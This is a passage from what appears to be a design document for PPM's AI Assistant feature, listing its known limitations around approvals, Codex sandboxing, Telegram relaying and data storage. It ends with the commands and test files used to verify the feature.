- Every session key goes through `resolveMigratedSession`; cards wait until answered or until PPM
  restarts.

## Known limitations

- **A waiting tool call holds its connection with no idle limit.** That is what lets an approval
  wait for the user, but a provider that vanishes without closing its TCP connection leaves the
  request waiting until the turn ends or PPM restarts; the card goes when the turn does.
- **Codex runs commands it deems safe without asking.** Under `untrusted`, its trusted read-only
  commands (`cat`, `ls`, …) run unasked and can read outside the registered projects; there is no
  per-path rule to give it. With Codex, what keeps that content on the machine is that every way
  out (web, shell beyond that set, writes, messages, MCP) asks or is off, and the read-only
  sandbox has no network (not checked by hand on Windows).
- **Codex on the account's own home gets the user's `AGENTS.md` back.** That is the fallback
  when the Assistant's home cannot be set up (an account with no `auth.json`, such as a keyring
  login, or links the file system refuses): losing the login would be worse. On the Assistant's
  own home, anything only the user's `config.toml` provides (a custom model provider, proxy
  settings) does not apply to Assistant sessions.
- **Codex skills.** If the skill list cannot be read, the catalogue still stays out of the
  prompt, but a skill the user names with `$name` in a message loads.
- **SQLite reads cannot be stopped.** bun:sqlite runs a statement synchronously with no
  interrupt, so the 60 s limit and the abort apply only before a statement starts.
- **MySQL/MariaDB**: the reach check's catalog query has been verified only by unit tests over
  sample rows, not against a live server; the Postgres one has an integration test
  (`tests/integration/assistant-sql-reach-postgres.test.ts`). The MySQL check also does not see
  loadable functions, which only an administrator installs.
- **Telegram keeps what it is sent.** Bot chats are not end-to-end encrypted: every answer, card
  (with its full command, file content or diff) and report the Assistant sends is stored on
  Telegram's servers. Redaction hides only secret shapes it knows; a password written in prose,
  or a key in an unknown format, goes out as written.
- **Not tried against real Telegram before handoff.** No bot token was available, so the bridge is
  tested only against the fake Bot API. What only a phone shows is unchecked: that the final
  message of a long turn and a card make the phone notify, how Telegram renders the HTML, and that
  an Open in PPM button reaches PPM through the tunnel or Tailscale.
- **Long content can only be decided in PPM.** A write, edit or command whose deciding input does
  not fit on a card, and a Codex patch whose full diff PPM does not hold, get Deny and Open in PPM
  on Telegram, and `chat_answer_approval` refuses to Allow them.
- **A restart ends what was in flight.** Cards, button codes and turns live in memory: after a
  restart the phone's drafts say the answer was cut off, its cards lose their buttons, and messages
  sent meanwhile ask Run or Skip. Watches survive; the hourly wake count does not (it restarts at
  zero).
- **A refused call in a watch turn reaches the provider as a plain denial.** Claude and Codex are
  not told why; the model knows from its instructions and the turn's context. The endpoint's own
  tools do return the reason.
- **Codex and the `ppm` CLI.** A Codex Assistant runs in a read-only sandbox; an approved
  `ppm …` command that writes PPM's data asks to leave it, and after Allow it runs (verified with a
  real Codex: `ppm projects add` wrote the project, and the running server listed it without a
  restart and kept it through its next save — `config-projects-sync.ts`). Separately, on a server
  running a non-default database profile, CLI data commands would open another instance's
  `ppm.db`; `ppm_cli_reference` warns the agent not to run them.
- **Telegram is text, photos up, and buttons.** No files, no images sent down; a question that
  takes only typed text is answered in PPM. One program may read a bot at a time: a second reader
  of the same bot (another PPM, another tool) breaks one of them.
- **A Codex secret answer** is kept out of PPM's session trace but stays in Codex's own rollout.

## Verify

`PPM_PLAYWRIGHT_MODULE=<playwright>/index.mjs node tests/e2e/assistant-e2e.mjs` runs the
Assistant on the production bundle, on a desktop and a phone viewport, against a scripted
provider (`tests/e2e/fixtures/assistant-server.ts`) that calls the real endpoint with each turn's
token and an isolated `PPM_HOME`. The header of the test file lists its scenarios and options.

`PPM_PLAYWRIGHT_MODULE=<playwright>/index.mjs node tests/e2e/assistant-telegram-e2e.mjs` does the
same for Telegram, with a fake Bot API in place of the phone. It needs Node 22.5+, Bun and a web
build with Monaco staged (`dist/web`, or `PPM_ASSISTANT_WEB_DIR`); `PPM_ASSISTANT_TG_ONLY=s1,s5`
runs a subset, and its header lists the rest.

The hub is covered below the browser: `tests/integration/assistant-telegram-bridge.test.ts` and
`assistant-telegram-relay.test.ts` run the bridge against the fake Bot API
(`tests/helpers/fake-telegram-bot-api.ts`) and the real chat socket layer with a mock provider, and
`tests/integration/assistant-watch-flow.test.ts` runs watches end to end; the unit tests are in
`tests/unit/services/assistant-telegram/`.
